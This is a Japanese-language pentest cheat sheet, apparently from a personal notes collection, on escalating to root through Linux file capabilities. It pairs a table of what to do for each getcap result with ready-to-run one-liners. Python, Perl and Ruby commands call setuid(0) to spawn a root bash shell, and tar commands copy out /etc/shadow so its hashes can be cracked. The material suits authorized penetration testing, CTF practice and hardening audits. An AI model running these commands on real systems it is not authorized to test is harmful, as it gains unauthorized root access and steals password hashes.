# Linux Capabilities による権限昇格

## 概要

Linux Capabilities は root 権限を細分化した仕組み。特定の Capability が付与されたバイナリは、非特権ユーザーが実行しても root 相当の特定操作が実行できる。SUID より見落とされやすいため優先して確認する。

---

## 着火条件

`getcap -r / 2>/dev/null` の出力に、スクリプト言語（python, perl, ruby等）または標準コマンドへの Capability 付与が見つかった場合。

---

## 観点・着眼点

**何が出たら次に何をするか：**

| `getcap` の出力 | 示唆 | 次のアクション |
|--------------|-----|------------|
| `python* = cap_setuid+eip` / `cap_setuid,...+eip` | スクリプト言語で UID 0 に切替可能 | `os.setuid(0)` からシェル起動（下の悪用手順 Python） |
| `perl = cap_setuid+eip` | 同上 | Perl で `POSIX::setuid(0)` |
| `ruby = cap_setuid+eip` | 同上 | Ruby で `Process::Sys.setuid(0)` |
| `tar = cap_dac_read_search+eip` | パーミッション無視で読み取り | `/etc/shadow` を tar で吸い出してクラック |
| `vim.basic = cap_setuid+eip` | vim から root になれる | `:py3 import os; os.setuid(0); os.execl(...)` |
| `cap_net_bind_service` のみ | 1024 以下ポートへのバインド許可のみ | 直接昇格に使えないので他要素（SUID / sudo）を探す |
| `cap_sys_admin` 付き任意バイナリ | ほぼ root 相当 | GTFOBins で悪用経路を検索 |
| フラグが `+ep` / `+eip` / `+p` で違う | Effective / Inheritable / Permitted の組合せ差 | `+e` が付いていれば基本的に悪用可。無い場合は execve 経由で有効化が必要 |

**`cap_setuid` が最も危険：** `setuid(0)` を呼び出すことで、そのプロセスの UID を root (0) に変更できる。スクリプト言語に付与されている場合は即座に root シェルを取れる。

**なぜ SUID より先に Capabilities を確認するのか：** SUID は `ls -la` で気づきやすいが、Capabilities は `getcap` 専用コマンドでしか見えないため管理者側でも見落とされていることが多い。かつ、既存バイナリへの付与なので怪しまれにくい。

---

## 手順

### 一次確認

```bash
# 全ファイルシステムを走査
getcap -r / 2>/dev/null

# getcap が入っていない環境
find / -type f \( -perm -u+s -o -perm -g+s \) 2>/dev/null  # SUID 経由で代替
# カーネル側の XATTR を直接読む
getfattr -n security.capability -R / 2>/dev/null
```

### Python で cap_setuid を悪用

```bash
# UID を 0(root) に変更してシェルを起動
python3 -c "import os; os.setuid(0); os.system('/bin/bash')"

# または特定コマンドを実行
python3 -c "import os; os.setuid(0); os.system('id')"
python3 -c "import os; os.setuid(0); os.system('cat /root/root.txt')"
```

### Perl で cap_setuid を悪用

```bash
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'
```

### Ruby で cap_setuid を悪用

```bash
ruby -e 'Process::Sys.setuid(0); exec "/bin/bash"'
```

### tar で cap_dac_read_search を悪用

```bash
# パーミッションに関わらず任意ファイルを読める
tar -cvf /tmp/shadow.tar /etc/shadow
tar -xvf /tmp/shadow.tar -C /tmp/
cat /tmp/etc/shadow
```

---

## Capabilities の意味一覧

| Capability | 権限の内容 |
|-----------|-----------|
| `cap_setuid` | 任意のUIDに変更可能 → **root昇格** |
| `cap_setgid` | 任意のGIDに変更可能 |
| `cap_net_bind_service` | 1024以下のポートにバインド可能（比較的安全） |
| `cap_net_raw` | RAWソケットの使用、パケットキャプチャ |
| `cap_dac_override` | ファイルパーミッションを無視して読み書き |
| `cap_dac_read_search` | ファイルパーミッションを無視して読み取り・ディレクトリ検索 |
| `cap_sys_ptrace` | プロセスへの ptrace アタッチ |
| `cap_sys_admin` | 非常に広範な特権操作 |

---

## GTFOBins での確認

GTFOBins (https://gtfobins.github.io/) の「Capabilities」フィルターで対象バイナリを検索すると悪用コマンドが確認できる。

---

## 注意点・落とし穴

- `getcap` コマンド自体がないシステムでは `/proc/[PID]/status` の `CapEff:` 行で確認が必要（16進ビットマスクなので `capsh --decode=[HEX]` でデコード）
- `+eip` は Effective・Inheritable・Permitted の略。`+ep` でも悪用可能。`+i` 単独だと exec された子プロセスに渡るだけなので直接悪用は不可
- `cap_net_bind_service` 単体では権限昇格に直接使えないが、他の Capability と組み合わさっている場合は注意
- シンボリックリンクに対しては Capabilities が効かない。実体を確認する（`readlink -f`）
- `cap_setuid` が付いたバイナリを `sudo` 経由や SUID 経由で実行した場合、挙動が異なる（既に EUID=0 なので効果なし）。非特権ユーザーとしてそのまま実行する
- スクリプトラッパー（`/usr/bin/python` が `/usr/bin/python3.8` へのシンボリックリンク等）の場合、`getcap` は実体側にしか反応しない。両方を確認

---

## 関連技術
- GTFOBins: https://gtfobins.github.io/
- SUID も確認 → `SUID_SGID.md`
- `/etc/shadow` を読めるようになった → ハッシュクラック: `../05_Tools_Reference/Hashcat.md`
